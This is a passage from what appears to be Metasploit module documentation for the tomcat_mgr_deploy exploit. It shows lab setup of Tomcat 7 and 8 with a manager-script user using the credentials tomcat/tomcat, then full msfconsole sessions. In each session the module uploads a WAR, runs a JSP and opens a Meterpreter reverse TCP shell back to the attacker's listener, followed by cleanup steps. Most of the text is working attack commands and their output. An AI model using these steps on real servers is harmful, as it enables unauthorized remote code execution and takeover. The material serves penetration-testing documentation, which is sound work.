192.168.2.156\nmsf exploit(tomcat_mgr_deploy) &gt; set rport 8080\nrport =&gt; 8080\nmsf exploit(tomcat_mgr_deploy) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_deploy) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_deploy) &gt; set target 3\ntarget =&gt; 3\nmsf exploit(tomcat_mgr_deploy) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using manually select target &quot;Linux x86&quot;\n[*] Uploading 1545 bytes as 9bj4IYa66cSpdK.war ...\n[!] No active DB -- Credential data will not be saved!\n[*] Executing /9bj4IYa66cSpdK/g3Yxbv3.jsp...\n[*] Transmitting intermediate stager...(106 bytes)\n[*] Sending stage (335800 bytes) to 192.168.2.156\n[*] Undeploying 9bj4IYa66cSpdK ...\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.156:40020) at 2017-01-11 21:18:31 -0500\n\nmeterpreter &gt; sysinfo\nComputer     : Ubuntu14.04\nOS           : Ubuntu 14.04 (Linux 4.2.0-27-generic)\nArchitecture : x64\nMeterpreter  : x86/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"tomcat7-7068---ubuntu-server-1604-64bit\" style=\"position:relative;\"><a href=\"#tomcat7-7068---ubuntu-server-1604-64bit\" aria-label=\"tomcat7 7068   ubuntu server 1604 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat7 (7.0.68) - Ubuntu server 16.04 64bit</h3>\n<p>Of note, as of Tomcat 7, the permission role <code class=\"language-text\">manager</code> has been divided into several sub-roles.  Each sub role the user has will change which <code class=\"language-text\">path</code> variable for exploitation.</p>\n<h4 id=\"setup-4\" style=\"position:relative;\"><a href=\"#setup-4\" aria-label=\"setup 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Install Tomcat and dependencies: <code class=\"language-text\">apt-get install tomcat7 tomcat7-admin</code></li>\n</ol>\n<h4 id=\"textscript-interface-exploitation-2\" style=\"position:relative;\"><a href=\"#textscript-interface-exploitation-2\" aria-label=\"textscript interface exploitation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>text/script Interface Exploitation</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">/etc/tomcat7/tomcat-users.xml</code> to add:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager-script&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-script&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart Tomcat: <code class=\"language-text\">sudo service tomcat7 restart</code></li>\n<li>To verify the permissions are all set correctly, browse to <code class=\"language-text\">http://192.168.2.118:8087/manager/text/deploy</code>, and you should see <code class=\"language-text\">FAIL - Invalid parameters supplied for command [/deploy]</code> as opposed to <code class=\"language-text\">403 Access Denied</code></li>\n<li>\n<p>Exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_deploy\nmsf exploit(tomcat_mgr_deploy) &gt; set rhost 192.168.2.118\nrhost =&gt; 192.168.2.118\nmsf exploit(tomcat_mgr_deploy) &gt; set rport 8087\nrport =&gt; 8087\nmsf exploit(tomcat_mgr_deploy) &gt; set target 3\ntarget =&gt; 3\nmsf exploit(tomcat_mgr_deploy) &gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_deploy) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(tomcat_mgr_deploy) &gt; exploit\nmsf exploit(tomcat_mgr_deploy) &gt; set path /manager/text\npath =&gt; /manager/text\nmsf exploit(tomcat_mgr_deploy) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using manually select target &quot;Linux x86&quot;\n[*] Uploading 1579 bytes as 9QymzSGGU0H4e.war ...\n[!] No active DB -- Credential data will not be saved!\n[*] Executing /9QymzSGGU0H4e/Mfz7dGecAsKTjSxfZgBv.jsp...\n[*] Undeploying 9QymzSGGU0H4e ...\n[*] Transmitting intermediate stager...(106 bytes)\n[*] Sending stage (335800 bytes) to 192.168.2.118\n[*] Meterpreter session 1 opened (192.168.2.117:4444 -&gt; 192.168.2.118:34294) at 2017-01-08 20:35:24 -0500\n\nmeterpreter &gt; sysinfo\nComputer     : 192.168.2.118\nOS           : Ubuntu 16.04 (Linux 4.4.0-21-generic)\nArchitecture : x64\nMeterpreter  : x86/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"tomcat8-8032---ubuntu-server-1604-64bit\" style=\"position:relative;\"><a href=\"#tomcat8-8032---ubuntu-server-1604-64bit\" aria-label=\"tomcat8 8032   ubuntu server 1604 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat8 (8.0.32) - Ubuntu server 16.04 64bit</h3>\n<p>Of note, as of 7, the permission role 'manager' has been divided into several sub-roles.  Each sub role the user has will change which <code class=\"language-text\">path</code> variable for exploitation.</p>\n<h4 id=\"setup-5\" style=\"position:relative;\"><a href=\"#setup-5\" aria-label=\"setup 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li><code class=\"language-text\">apt-get install tomcat8 tomcat8-admin</code></li>\n</ol>\n<h4 id=\"textscript-interface-exploitation-3\" style=\"position:relative;\"><a href=\"#textscript-interface-exploitation-3\" aria-label=\"textscript interface exploitation 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>text/script Interface Exploitation</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">/etc/tomcat8/tomcat-users.xml</code> to add:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager-script&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-script&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart tomcat: <code class=\"language-text\">sudo service tomcat8 restart</code></li>\n<li>To verify the permissions are all set correctly, browse to <code class=\"language-text\">http://192.168.2.118:8087/manager/text/deploy</code>, and you should see <code class=\"language-text\">FAIL - Invalid parameters supplied for command [/deploy]</code> as opposed to <code class=\"language-text\">403 Access Denied</code></li>\n<li>\n<p>Exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_deploy\nmsf exploit(tomcat_mgr_deploy) &gt; set rhost 192.168.2.118\nrhost =&gt; 192.168.2.118\nmsf exploit(tomcat_mgr_deploy) &gt; set rport 8088\nrport =&gt; 8088\nmsf exploit(tomcat_mgr_deploy) &gt; set target 3\ntarget =&gt; 3\nmsf exploit(tomcat_mgr_deploy) &gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_deploy) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(tomcat_mgr_deploy) &gt; set path /manager/text\npath =&gt; /manager/text\nmsf exploit(tomcat_mgr_deploy) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using manually select target &quot;Linux x86&quot;\n[*] Uploading 1560 bytes as 9s0fTUyPa2HJCDnod2wEQJ.war ...\n[!] No active DB -- Credential data will not be saved!\n[*] Executing /9s0fTUyPa2HJCDnod2wEQJ/ndAfDrUY.jsp...\n[*] Undeploying 9s0fTUyPa2HJCDnod2wEQJ ...\n[*] Transmitting intermediate stager...(106 bytes)\n[*] Sending stage (335800 bytes) to 192.168.2.118\n[*] Meterpreter session 1 opened (192.168.2.117:4444 -&gt; 192.168.2.118:33802) at 2017-01-14 11:06:13 -0500\n\nmeterpreter &gt; sysinfo\nComputer     : 192.168.2.118\nOS           : Ubuntu 16.04 (Linux 4.4.0-59-generic)\nArchitecture : x64\nMeterpreter  : x86/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h2 id=\"manual-cleanup\" style=\"position:relative;\"><a href=\"#manual-cleanup\" aria-label=\"manual cleanup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Manual Cleanup</h2>\n<p>Manual cleanup can be done by logging into the <code class=\"language-text\">/manager</code> website.  From there, click <code class=\"language-text\">Undeploy</code> within the <code class=\"language-text\">Application</code> list to remove the malicious app from Tomcat.</p>"}}},"pageContext":{"id":"5aa08c85-9de6-553b-9891-ee7c37a19a40"}}}